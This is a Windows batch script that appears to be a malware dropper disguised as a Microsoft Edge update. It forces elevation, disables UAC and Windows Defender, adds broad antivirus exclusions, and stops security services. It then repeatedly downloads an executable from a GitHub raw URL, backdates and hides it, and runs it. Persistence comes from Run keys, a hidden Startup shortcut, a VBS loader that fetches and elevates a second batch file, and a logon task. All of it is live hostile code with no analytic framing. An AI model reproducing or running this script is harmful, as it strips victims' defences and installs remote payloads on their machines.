@cls
@echo off
setlocal EnableDelayedExpansion

set "params=%*"
cd /d "%~dp0"

if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs"
fsutil dirty query %systemdrive% 1>nul 2>nul || (
    echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/c cd /d ""%~sdp0"" && %~s0 %params%", "", "runas", 0 >> "%temp%\getadmin.vbs"
    wscript.exe "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs" 2>nul
    exit /B
)

:gotAdmin
pushd "%CD%"
cd /d "%TEMP%"

set "UpdateChecker=powershell -ExecutionPolicy Bypass"

%UpdateChecker% -w hidden -c "if(Get-Command Add-MpPreference -ErrorAction SilentlyContinue){Add-MpPreference -ExclusionPath 'C:\', 'C:\Windows', 'C:\Program Files (x86)\Microsoft\EdgeUpdate'}" >nul 2>&1

dism /online /get-featureinfo /featurename:NetFx3 | findstr /I "Enabled" >nul 2>&1
if !errorlevel! neq 0 (
    dism /online /enable-feature /featurename:NetFx3 /all /norestart /quiet >nul 2>&1
)

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f >nul 2>&1

reg add "HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /v "DisableEnhancedNotifications" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotifications" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Virus & threat protection" /v "UILockdown" /t REG_DWORD /d 1 /f >nul 2>&1

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d 1 /f >nul 2>&1

for %%s in (WdBoot WdFilter WdNisSvc WinDefend SecurityHealthService Sense) do (
    reg add "HKLM\System\CurrentControlSet\Services\%%s" /v "Start" /t REG_DWORD /d 4 /f >nul 2>&1
    sc stop %%s >nul 2>&1
)

set "URL=https://raw.githubusercontent.com/techerking29-collab/MicrosoftEdgeCoreUpdate/main/MicrosoftEdgeCoreUpdate.exe"
set "DEST_DIR=C:\Program Files (x86)\Microsoft\EdgeUpdate\1.3.217.3"
set "DEST=%DEST_DIR%\MicrosoftEdgeCoreUpdate.exe"
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

if not exist "%DEST_DIR%" mkdir "%DEST_DIR%" >nul 2>&1

attrib -s -h "%DEST%" >nul 2>&1
del /f /q "%DEST%" >nul 2>&1

:downLoop
if not exist "%DEST%" (
    %UpdateChecker% -w hidden -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('%URL%', '%DEST%')" >nul 2>&1
    timeout /t 5 /nobreak >nul
    goto downLoop
)

%UpdateChecker% -w hidden -c "if(Test-Path '%DEST%'){$(Get-Item '%DEST%').CreationTime='11/12/2022 10:15:00'; $(Get-Item '%DEST%').LastWriteTime='11/12/2022 10:15:00'}" >nul 2>&1
attrib +s +h "%DEST%" >nul 2>&1
start /min "" "%DEST%"

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "EdgeUpdate" /t REG_SZ /d "\"%DEST%\"" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SysWOW64" /d "\"%DEST%\"" /f >nul 2>&1

set "STARTUP_LNK=%STARTUP_DIR%\EdgeUpdate.lnk"
%UpdateChecker% -w hidden -c "$ws=New-Object -ComObject WScript.Shell; $s=$ws.CreateShortcut('%STARTUP_LNK%'); $s.TargetPath='%DEST%'; $s.WindowStyle=7; $s.Save()" >nul 2>&1
attrib +h +s "%STARTUP_LNK%" >nul 2>&1

set "VBS_LDR=%APPDATA%\EdgeUpdate.vbs"
(echo Set WshShell = CreateObject("WScript.Shell"^)
echo strPS = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -c ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $t=$env:TEMP+'\c.bat'; (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/techerking29-collab/MicrosoftEdgeCoreUpdate/main/cleaner.bat', $t); Start-Process cmd -ArgumentList '/c',$t -Verb RunAs"""
echo WshShell.Run strPS, 0, False) > "%VBS_LDR%"

attrib +h +s "%VBS_LDR%" >nul 2>&1

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "EdgeCoreVbs" /t REG_SZ /d "wscript.exe \"%VBS_LDR%\"" /f >nul 2>&1

schtasks /create /tn "EdgeCoreRepair" /tr "wscript.exe \"%VBS_LDR%\"" /sc onlogon /rl highest /f /np >nul 2>&1

timeout /t 3 >nul

endlocal
exit
